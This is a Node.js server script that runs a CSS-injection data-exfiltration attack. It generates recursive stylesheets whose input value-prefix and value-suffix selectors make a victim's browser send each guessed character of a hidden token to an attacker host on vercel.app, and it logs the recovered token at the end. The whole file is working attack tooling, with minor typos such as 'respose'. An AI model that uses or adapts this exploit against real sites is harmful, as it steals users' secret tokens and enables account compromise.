const http = require('http')
const url = require('url')

const PORT = 80
const HOSTNAME = `https://data-exfiltration-via-css.vercel.app:${PORT}`

let prefix = ''
let postfix = ''

let pending = []
let stop = false
let ready = 0
let n = 0

const generateResponse = (response) => {
  console.log('...pre-payoad: ' + prefix)
  console.log('...post-payoad: ' + postfix)

  let css =
    `@import url(${HOSTNAME}/next?${Math.random()});\n\n` +
    [
      0,
      1,
      2,
      3,
      4,
      5,
      6,
      7,
      8,
      9,
      'a',
      'b',
      'c',
      'd',
      'e',
      'f',
      'g',
      'h',
      'i',
      'l',
      'm',
      'n',
      'o',
      'p',
      'q',
      'r',
      's',
      't',
      'v',
      'w',
      'x',
      'y',
      'z',
    ]
      .map((char) => `input[value$="${char + postfix}"] { --e${n}: url(${HOSTNAME}/leak?post=${char + postfix}) }\n`)
      .join('') +
    `\ninput { background: var(--e${n}, none) }\n\n` +
    [
      0,
      1,
      2,
      3,
      4,
      5,
      6,
      7,
      8,
      9,
      'a',
      'b',
      'c',
      'd',
      'e',
      'f',
      'g',
      'h',
      'i',
      'l',
      'm',
      'n',
      'o',
      'p',
      'q',
      'r',
      's',
      't',
      'v',
      'w',
      'x',
      'y',
      'z',
    ]
      .map((char) => `input[value^="${prefix + char}"] { --s${n}: url(${HOSTNAME}/leak?pre=${prefix + char}) }\n`)
      .join('') +
    `\ninput { border-image: var(--s${n}, none) }\n` +
    `\ninput[value='${prefix + postfix}] { list-style: url(${HOSTNAME}/end?token=${prefix + postfix}&); }`

  response.writeHead(200, { 'Content-Type': 'text/css' })
  response.write(css)
  response.end()

  n++
}

const requestHandler = (request, response) => {
  let req = url.parse(request.url, url)

  console.log('req: %s', request.url)

  if (stop) return response.end()

  switch (req.pathname) {
    case '/start':
      generateResponse(response)
      break
    case '/leak':
      response.end()

      if (req.query.pre && prefix !== req.query.pre) {
        prefix = req.query.pre
      } else if (req.query.post && postfix !== req.query.post) {
        postfix = req.query.post
      } else {
        break
      }

      if (ready == 2) {
        generateResponse(pending.shift())
        ready = 0
      } else {
        ready++
        console.log('leak: waiting others...')
      }
      break
    case '/next':
      if (ready == 2) {
        generateResponse(respose)
        ready = 0
      } else {
        pending.push(response)
        ready++
        console.log('query: waiting others...')
      }
      break
    case '/end':
      stop = true
      console.log('[+] END: %s', req.query.token)
    default:
      response.end("You know I'm, I'm bad, you know it!!")
  }
}

const server = http.createServer(requestHandler)

server.listen(PORT, (err) => {
  if (err) {
    return console.log('[-] Error: something bad happened', err)
  }
  console.log('[+] Server is listening on %d', PORT)
})
